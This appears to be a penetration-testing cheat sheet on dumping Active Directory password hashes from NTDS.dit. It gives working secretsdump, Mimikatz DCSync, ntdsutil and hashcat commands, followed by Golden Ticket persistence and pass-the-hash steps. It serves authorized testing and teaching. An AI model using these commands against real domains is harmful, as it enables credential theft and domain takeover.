# Dumping NTDS.dit

## What Is NTDS.dit?

The Active Directory database stored on every Domain Controller. Contains:
- All user accounts
- All group memberships
- Security descriptors
- **All password hashes for every domain account**

Location: `%SystemRoot%\NTDS\ntds.dit`

---

## Privileges Required

| Phase | Account / Privilege | Why |
|---|---|---|
| **Remote dump** (`secretsdump.py`, DCSync) | **DCSync rights** = `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` on the domain object | DA, Enterprise Admin, and Schema Admin have these by default. Sometimes specifically delegated to service / backup accounts |
| **On-DC snapshot** (`ntdsutil ifm` / `ntdsutil snapshot`) | **Local Administrator on the DC** | VSS snapshot creation is admin-only |
| **Direct file copy** of `ntds.dit` + SYSTEM hive | **`SeBackupPrivilege` on the DC** | Bypasses NTFS ACLs. Backup Operators / Server Operators have this and can dump NTDS *without being DA* — frequently-forgotten escalation path |
| **Crack** the extracted hashes | **None** — offline on attacker box | hashcat / john locally |

**Get there:** If you don't have DA, look for accounts with DCSync rights ([BloodHound](../enumeration/bloodhound.md) highlights `DCSync` edges). Also check membership in **Backup Operators**, **Server Operators**, or **Print Operators** on the DC — all of which carry `SeBackupPrivilege` or equivalent shortcuts. For getting *to* one of those accounts: see the AD attack chain ([Kerberoasting](../post-compromise/kerberoasting.md), [ACL Abuse](../post-compromise/acl-abuse.md), [ADCS Attacks](../post-compromise/adcs-attacks.md)).

---

## secretsdump (Impacket) — Recommended

```sh
# Full dump (all hashes, Kerberos keys, cleartext if available)
secretsdump.py DOMAIN/user:'Password'@<DC-IP>

# NTLM hashes only (faster, cleaner)
secretsdump.py DOMAIN/user:'Password'@<DC-IP> -just-dc-ntlm

# Using hash authentication
secretsdump.py DOMAIN/user@<DC-IP> -hashes :<NTLM-hash> -just-dc-ntlm
```

Output format:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
Format: `user:RID:LM-hash:NT-hash:::`

---

## Cracking NTDS Hashes

Extract only the NT hash (second half after the third colon):

```sh
# Crack NT hashes (hashcat mode 1000 = NTLM)
hashcat -m 1000 ntds_hashes.txt /usr/share/wordlists/rockyou.txt

# Show already cracked
hashcat -m 1000 ntds_hashes.txt /usr/share/wordlists/rockyou.txt --show
```

---

## Via Mimikatz (DCSync)

```sh
# Dump all hashes without touching the NTDS.dit file
lsadump::dcsync /domain:domain.local /all /csv

# Single user
lsadump::dcsync /domain:domain.local /user:Administrator
```

---

## Via ntdsutil (Windows — From DC)

```cmd
ntdsutil "ac i ntds" "ifm" "create full C:\temp" q q
```

---

## What to Do After

1. Crack hashes with hashcat
2. Pass the Hash for any accounts that cannot be cracked
3. Create Golden Ticket with krbtgt hash for persistence
4. Enumerate shares for sensitive data
5. **Delete any accounts you created** during the engagement
6. Document everything for the report

---

## Post-Domain Compromise Checklist

- [ ] Dump NTDS.dit
- [ ] Crack hashes (Administrator + high-value accounts)
- [ ] Enumerate shares: `netexec smb <cidr> -u admin -H <hash> --shares`
- [ ] Create Golden Ticket for persistence (if needed)
- [ ] Delete any test accounts created
